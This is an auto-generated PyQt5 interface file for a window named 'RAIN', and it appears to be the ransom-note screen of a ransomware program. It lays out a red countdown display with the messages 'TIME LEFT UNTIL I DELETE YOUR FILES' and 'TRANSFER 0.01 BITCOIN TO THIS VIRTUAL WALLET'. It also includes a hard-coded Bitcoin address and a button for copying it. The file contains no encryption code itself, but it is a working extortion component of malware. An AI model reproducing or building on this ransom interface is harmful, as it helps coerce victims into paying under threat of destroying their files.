# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'design.ui'
#
# Created by: PyQt5 UI code generator 5.14.1
#
# WARNING! All changes made in this file will be lost!


from PyQt5 import QtCore, QtGui, QtWidgets


class Ui_MW_Counter(object):
    def setupUi(self, MW_Counter):
        MW_Counter.setObjectName("MW_Counter")
        MW_Counter.setFixedSize(700, 450)
        MW_Counter.setWindowTitle("")
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("../../../../../../../../clock.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        MW_Counter.setWindowIcon(icon)
        MW_Counter.setStyleSheet("background: grey;")
        self.centralwidget = QtWidgets.QWidget(MW_Counter)
        self.centralwidget.setObjectName("centralwidget")
        self.gridLayout = QtWidgets.QGridLayout(self.centralwidget)
        self.gridLayout.setObjectName("gridLayout")
        self.LBL_Counter = QtWidgets.QLabel(self.centralwidget)
        font = QtGui.QFont()
        font.setFamily("alarm clock")
        font.setPointSize(80)
        font.setItalic(False)
        self.LBL_Counter.setFont(font)
        self.LBL_Counter.setMouseTracking(False)
        self.LBL_Counter.setStyleSheet("background: red;\n"
"color: white;\n"
"border-style: solid;\n"
"border-width: 5px;")
        self.LBL_Counter.setText("")
        self.LBL_Counter.setAlignment(QtCore.Qt.AlignCenter)
        self.LBL_Counter.setObjectName("LBL_Counter")
        self.gridLayout.addWidget(self.LBL_Counter, 2, 0, 1, 1)
        self.LBL_T3 = QtWidgets.QLabel(self.centralwidget)
        font = QtGui.QFont()
        font.setFamily("Trebuchet MS")
        font.setPointSize(30)
        self.LBL_T3.setFont(font)
        self.LBL_T3.setAlignment(QtCore.Qt.AlignCenter)
        self.LBL_T3.setObjectName("LBL_T3")
        self.gridLayout.addWidget(self.LBL_T3, 6, 0, 1, 1)
        self.LBL_T2 = QtWidgets.QLabel(self.centralwidget)
        font = QtGui.QFont()
        font.setFamily("Trebuchet MS")
        font.setPointSize(20)
        self.LBL_T2.setFont(font)
        self.LBL_T2.setAlignment(QtCore.Qt.AlignCenter)
        self.LBL_T2.setObjectName("LBL_T2")
        self.gridLayout.addWidget(self.LBL_T2, 3, 0, 1, 1)
        self.LBL_Rain = QtWidgets.QLabel(self.centralwidget)
        font = QtGui.QFont()
        font.setFamily("Doctor Glitch")
        font.setPointSize(60)
        self.LBL_Rain.setFont(font)
        self.LBL_Rain.setAlignment(QtCore.Qt.AlignCenter)
        self.LBL_Rain.setObjectName("LBL_Rain")
        self.gridLayout.addWidget(self.LBL_Rain, 0, 0, 1, 1)
        self.LBL_T1 = QtWidgets.QLabel(self.centralwidget)
        font = QtGui.QFont()
        font.setFamily("Trebuchet MS")
        font.setPointSize(30)
        self.LBL_T1.setFont(font)
        self.LBL_T1.setAlignment(QtCore.Qt.AlignCenter)
        self.LBL_T1.setObjectName("LBL_T1")
        self.gridLayout.addWidget(self.LBL_T1, 1, 0, 1, 1)
        self.LE_Wallet = QtWidgets.QLineEdit(self.centralwidget)
        self.LE_Wallet.setEnabled(False)
        font = QtGui.QFont()
        font.setFamily("Trebuchet MS")
        font.setPointSize(20)
        self.LE_Wallet.setFont(font)
        self.LE_Wallet.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
        self.LE_Wallet.setAlignment(QtCore.Qt.AlignCenter)
        self.LE_Wallet.setObjectName("LE_Wallet")
        self.gridLayout.addWidget(self.LE_Wallet, 4, 0, 1, 1)
        self.BTN_Copy = QtWidgets.QPushButton(self.centralwidget)
        self.BTN_Copy.setObjectName("BTN_Copy")
        self.gridLayout.addWidget(self.BTN_Copy, 5, 0, 1, 1)
        MW_Counter.setCentralWidget(self.centralwidget)

        self.retranslateUi(MW_Counter)
        QtCore.QMetaObject.connectSlotsByName(MW_Counter)

    def retranslateUi(self, MW_Counter):
        _translate = QtCore.QCoreApplication.translate
        self.LBL_T3.setText(_translate("MW_Counter", "DON\'T MAKE ME WAIT"))
        self.LBL_T2.setText(_translate("MW_Counter", "TRANSFER 0.01 BITCOIN TO THIS VIRTUAL WALLET"))
        self.LBL_Rain.setText(_translate("MW_Counter", "RAIN"))
        self.LBL_T1.setText(_translate("MW_Counter", "TIME LEFT UNTIL I DELETE YOUR FILES"))
        self.LE_Wallet.setText(_translate("MW_Counter", "18mB1n8bDXHxie9R4qAqHibUppaiwuQYXK"))
        self.BTN_Copy.setText(_translate("MW_Counter", "COPY"))
